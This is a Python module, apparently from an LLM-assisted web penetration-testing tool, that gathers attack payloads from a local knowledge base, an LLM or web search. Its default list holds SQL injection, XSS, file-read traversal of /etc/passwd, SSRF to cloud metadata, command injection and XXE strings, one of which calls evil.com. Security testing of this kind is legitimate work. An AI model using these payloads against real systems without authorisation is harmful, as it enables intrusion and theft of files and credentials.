"""Stage 7 — Librarian Agent.

Payload sourcing from local knowledge base (KB) with optional MCP web search
fallback. Offline-first: searches local wordlists by tag/category, with
optional live search via Brave Search MCP when local KB is insufficient.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any, Optional

from nagapasha.llm.runner import AnthropicRunner

logger = logging.getLogger(__name__)

# Local KB directory
KB_DIR = Path("nagapasha/llm/kb")


class LibrarianError(Exception):
    """Raised when the Librarian agent fails."""


async def run_librarian(
    attack_classes: list[str],
    tech_stack: Optional[dict[str, Any]] = None,
    runner: Optional[AnthropicRunner] = None,
    timeout: int = 120,
    use_mcp: bool = False,
) -> dict[str, Any]:
    """Run the Librarian agent.

    Args:
        attack_classes: List of attack class names to source payloads for.
        tech_stack: Detected tech stack context.
        runner: AnthropicRunner instance. If None, uses offline KB only.
        timeout: Timeout in seconds.
        use_mcp: If True, use Brave Search MCP when local KB is insufficient.

    Returns:
        Dict mapping attack_class -> list of payload dicts.
    """
    # Offline-first: search local KB
    payloads = _search_local_kb(attack_classes)

    # If local KB is insufficient and MCP enabled, enrich with live search
    if use_mcp and not payloads:
        try:
            enriched = await _search_mcp_online(
                runner, attack_classes, tech_stack, timeout
            )
            if enriched:
                payloads = enriched
                logger.info(
                    f"Librarian: MCP search returned {len(enriched)} attack classes"
                )
        except Exception as e:
            logger.warning(f"Librarian: MCP search failed, falling back: {e}")

    # If we have results and an LLM runner, enrich with live insights
    if runner and payloads:
        try:
            enriched = _enrich_with_llm(runner, attack_classes, payloads, tech_stack, timeout)
            if enriched:
                return enriched
        except Exception:
            pass  # Fall back to local KB results

    # If no KB results, use default payloads
    if not payloads:
        default = get_default_payloads()
        for ac in attack_classes:
            if ac not in payloads and ac in default:
                payloads[ac] = default[ac]

    return payloads


def _search_local_kb(attack_classes: list[str]) -> dict[str, Any]:
    """Search the local knowledge base for payloads.

    Returns dict mapping attack_class -> list of payload objects.
    """
    result: dict[str, Any] = {}

    if not KB_DIR.exists():
        return result

    for attack_class in attack_classes:
        # Try exact match first
        kb_file = KB_DIR / f"{attack_class}.json"
        if kb_file.exists():
            try:
                data = json.loads(kb_file.read_text())
                result[attack_class] = data.get("payloads", [])
                continue
            except (json.JSONDecodeError, KeyError):
                pass

        # Try tag-based search
        for kb_file in KB_DIR.glob("*.json"):
            try:
                data = json.loads(kb_file.read_text())
                tags = data.get("tags", [])
                if attack_class.lower().replace(" ", "_") in tags:
                    if attack_class not in result:
                        result[attack_class] = []
                    result[attack_class].extend(data.get("payloads", []))
            except (json.JSONDecodeError, KeyError):
                continue

    return result


async def _search_mcp_online(
    runner: Optional[AnthropicRunner],
    attack_classes: list[str],
    tech_stack: Optional[dict[str, Any]],
    timeout: int,
) -> Optional[dict[str, Any]]:
    """Search using MCP web search tools (Brave Search).

    The LLM agent is prompted to use MCP tools to search the internet for
    relevant payloads, wordlists, and technique documentation.
    """
    if not runner:
        logger.debug("Librarian: no runner, skipping MCP search")
        return None

    context = {
        "attack_classes": attack_classes,
        "tech_stack": tech_stack or {},
        "use_mcp": True,
        "constraint": (
            "Output ONLY valid JSON. No markdown fences. No commentary. "
            "Use the MCP web_search tool to find payloads when local KB is insufficient."
        ),
    }

    try:
        response = await runner.invoke(stage="librarian", context=context, timeout=timeout)
    except Exception as e:
        logger.warning(f"Librarian: MCP search failed: {e}")
        return None

    if response.get("status") != "ok":
        logger.warning(f"Librarian: MCP search returned error: {response}")
        return None

    data = response.get("data", {})
    if not isinstance(data, dict):
        logger.warning("Librarian: MCP search returned non-dict data")
        return None

    return data


def _enrich_with_llm(
    runner: AnthropicRunner,
    attack_classes: list[str],
    existing_payloads: dict[str, Any],
    tech_stack: Optional[dict[str, Any]],
    timeout: int,
) -> Optional[dict[str, Any]]:
    """Enrich local KB results with LLM-sourced payloads."""
    context = {
        "attack_classes": attack_classes,
        "existing_payloads": existing_payloads,
        "tech_stack": tech_stack or {},
        "constraint": "Output ONLY valid JSON. No markdown fences. No commentary.",
    }

    try:
        response = runner.invoke(stage="librarian", context=context, timeout=timeout)
    except Exception:
        return None

    if response.get("status") != "ok":
        return None

    data = response.get("data", {})
    if not isinstance(data, dict):
        return None

    return data


def get_default_payloads() -> dict[str, Any]:
    """Return default payloads for common attack classes.

    Used when no KB or LLM is available.
    """
    return {
        "sql_injection": [
            {"value": "' OR '1'='1", "encoding": "none", "technique": "classic SQLi"},
            {"value": "' UNION SELECT NULL--", "encoding": "none", "technique": "UNION-based"},
            {"value": "'; WAITFOR DELAY '0:0:5'--", "encoding": "none", "technique": "time-based blind"},
            {"value": "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
             "encoding": "none", "technique": "error-based"},
        ],
        "xss": [
            {"value": "<script>alert(1)</script>", "encoding": "none", "technique": "reflected XSS"},
            {"value": "<img src=x onerror=alert(1)>", "encoding": "none", "technique": "img tag XSS"},
            {"value": "javascript:alert(1)", "encoding": "none", "technique": "javascript URI"},
            {"value": "<svg onload=alert(1)>", "encoding": "none", "technique": "svg XSS"},
        ],
        "lfi": [
            {"value": "../../../etc/passwd", "encoding": "none", "technique": "path traversal"},
            {"value": "....//....//....//etc/passwd", "encoding": "none", "technique": "bypass filters"},
            {"value": "/proc/self/environ", "encoding": "none", "technique": "Linux proc"},
            {"value": "C:\\Windows\\win.ini", "encoding": "none", "technique": "Windows file"},
        ],
        "idor": [
            {"value": "1", "encoding": "none", "technique": "sequential ID"},
            {"value": "0", "encoding": "none", "technique": "zero ID"},
            {"value": "-1", "encoding": "none", "technique": "negative ID"},
        ],
        "ssrf": [
            {"value": "http://127.0.0.1", "encoding": "none", "technique": "localhost"},
            {"value": "http://localhost", "encoding": "none", "technique": "localhost"},
            {"value": "http://169.254.169.254", "encoding": "none", "technique": "cloud metadata"},
            {"value": "http://[::1]", "encoding": "none", "technique": "ipv6 localhost"},
        ],
        "path_traversal": [
            {"value": "../../../etc/passwd", "encoding": "none", "technique": "path traversal"},
            {"value": "....//....//etc/passwd", "encoding": "none", "technique": "filter bypass"},
        ],
        "command_injection": [
            {"value": ";cat /etc/passwd", "encoding": "none", "technique": "command chaining"},
            {"value": "|ls", "encoding": "none", "technique": "pipe injection"},
            {"value": "`id`", "encoding": "none", "technique": "command substitution"},
        ],
        "xxe": [
            {"value": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "encoding": "none", "technique": "XXE external entity"},
            {"value": "<!ENTITY xxe SYSTEM 'http://evil.com'>", "encoding": "none", "technique": "XXE network"},
        ],
        "generic_injection": [
            {"value": "' OR 1=1--", "encoding": "none", "technique": "generic injection"},
            {"value": "1 AND 1=1", "encoding": "none", "technique": "boolean-based"},
        ],
    }
